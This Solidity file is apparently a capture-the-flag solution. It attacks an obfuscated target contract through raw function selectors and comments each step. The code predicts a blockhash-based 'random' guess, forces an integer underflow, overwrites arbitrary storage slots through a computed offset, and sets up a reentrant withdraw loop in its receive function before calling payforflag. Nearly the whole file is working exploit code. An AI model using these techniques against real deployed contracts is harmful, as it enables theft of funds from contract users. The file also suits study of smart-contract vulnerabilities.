pragma solidity ^0.8.11;

import "../../console.sol";


contract Base {

    address target;
    bool callback_called = false;
    uint nb_withdrawals = 0;

    constructor(address _target) payable {
        console.log(address(this));
        target = _target;
        gift();
    }

    function gift() internal {
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x24b04905));
        require(success, "Failed gift");
    }

    function guess() public {
        uint256 arg0 = uint256(blockhash(block.number-1)) % 3;
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x9189fec1,arg0));
        require(success, "Failed guess");
    }

    function func_06CE() public {
        uint256 arg0 = 0x42;
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x23de8635,arg0));
        require(success, "Failed func_06CE");
    }

    function buy() public {
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0xa6f2ae3a));
        require(success, "Failed buy");
    }

    function retract() public {
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x47f57b32));
        require(success, "Failed retract");
    }


    function revise(uint256 slot, uint256 val) public {
        unchecked {
            uint256 arg0 = 0 - uint256(keccak256(abi.encodePacked(uint256(0x1))));
            (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x0339f300, arg0 + slot, val));
            require(success, "Failed revise");
        }
    }

    function payforflag(string calldata b64email) public {
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x6bc344bc, b64email));
        require(success, "Failed payforflag");
    }

    function withdraw(uint _n) public {
        require(_n > 0);

        nb_withdrawals = _n - 1;
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x2e1a7d4d, 0x64));
        require(success, "Failed withdraw");
    }

    // This function is called for all messages sent to
    // this contract w/ an invalid selector
    // func_06CE callback(uint256 val) internal returns (bool) {
    fallback() external {

        bytes4 selector = bytes4(msg.data[:4]);
        if (selector == 0xa8286aca){
            if (callback_called){
                assembly {
                    let p := mload(0x40)
                    mstore(p,1)
                    return(p,32)
                }
            }
            callback_called = true;
            assembly {
                let p := mload(0x40)
                mstore(p,0)
                return(p,32)
            }
        }
        require(false, "Invalid selector");
    }

    // This function is called for plain Ether transfers, i.e.
    // for every call with empty calldata
    receive() external payable {
        if (nb_withdrawals == 0){
            return;
        }
        (bool success, bytes memory result) = target.call(abi.encodeWithSelector(0x2e1a7d4d, 0x64));
        nb_withdrawals -= 1;

    }
}


contract Deploy {
    event Deployed(address);

    constructor(address target) {

        console.log(address(msg.sender));
        console.log(address(this));
        // Step 1: create two contracts, both will call gift()
        // storage[a+4] = 0x64; storage[a+5] = 1; storage[a+6] = 1;
        Base a = new Base(target);
        emit Deployed(address(a));

        // storage[b+4] = 0x64; storage[b+5] = 1; storage[b+6] = 1;
        Base b = new Base(target);
        emit Deployed(address(b));

        // Step 2: set second half of storage[0] to 1
        a.guess();

        // Step 3: storage[2] = 1; storage[3] = 0x42
        a.func_06CE();

        // Step 4: storage[a+5] += 1; storage[a+6] += 1
        //         storage[b+5] += 1; storage[b+6] += 1
        a.buy();
        b.buy();

        // Step 5: storage[1] -= 1; (underflow)
        a.retract();

        // Step 6
        a.revise(0, uint256(uint160(address(a))) + (1 << (0x14*8)));
        b.revise(uint256(keccak256(abi.encode(address(a), uint256(5)))), 0x8ac7230489e80001);

        a.payforflag("l33t");

    }
}
